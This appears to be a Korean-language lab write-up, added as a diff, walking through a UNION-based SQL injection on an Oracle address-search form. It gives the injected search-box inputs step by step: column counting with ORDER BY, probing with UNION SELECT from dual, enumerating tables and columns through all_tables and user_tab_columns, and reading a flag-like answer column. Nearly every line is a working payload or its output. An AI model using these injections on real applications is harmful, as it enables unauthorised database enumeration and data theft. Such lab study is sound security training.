@@ -1,0 +1,29 @@
+예상 쿼리문 : select * from address where addr like '%_addr_%';
+
+검색창: 삼성동%' order by 1--
+select * from address where addr like '%삼성동%' order by 1--
+-> 이를 통해서 테이블의 컬럼 개수 파악 (5개)
+
+검색창: 삼성동%' union select 'a','b',null,null,null from dual where '%'='
+select * from address where addr like '%삼성동%' union select 'a','b',null,null,null from dual where '%'='%';
+-> 사용할 수 있는 칸 파악
+
+검색창: 삼성동%' union select owner,table_name,null,null,null from all_tables where owner=user and '%'='
+SKINFOSEC5	MEMBER
+SKINFOSEC5	SQL_UNION_ANSWER
+SKINFOSEC5	ZIPCODE
+-> owner가 user인 테이블 존재 체크
+
+검색창: 삼성동%' union select table_name,column_name,null,null,null from user_tab_columns where table_name='SQL_UNION_ANSWER' and '%'='
+(all_tab_colums는 전체 테이블에 대한 컬럼 -> cols/user_tab_columns도 가능)
+[SQL_UNION_ANSWER]
+SQL_UNION_ANSWER	ANSWER_COLUMN
+SQL_UNION_ANSWER	REG_ACCT_ID
+SQL_UNION_ANSWER	REG_DT
+SQL_UNION_ANSWER	UDT_ACCT_ID
+SQL_UNION_ANSWER	UDT_DT
+-> 수상한 테이블에 대한 컬럼명 확인
+
+검색창: 삼성동%' union select 'a',ANSWER_COLUMN,null,null,null from SQL_UNION_ANSWER where '%'='
+ANSWER_COLUMN: this_is_perfect_answer
+-> 답이 존재할 것 같은 컬럼에 대한 데이터 확인
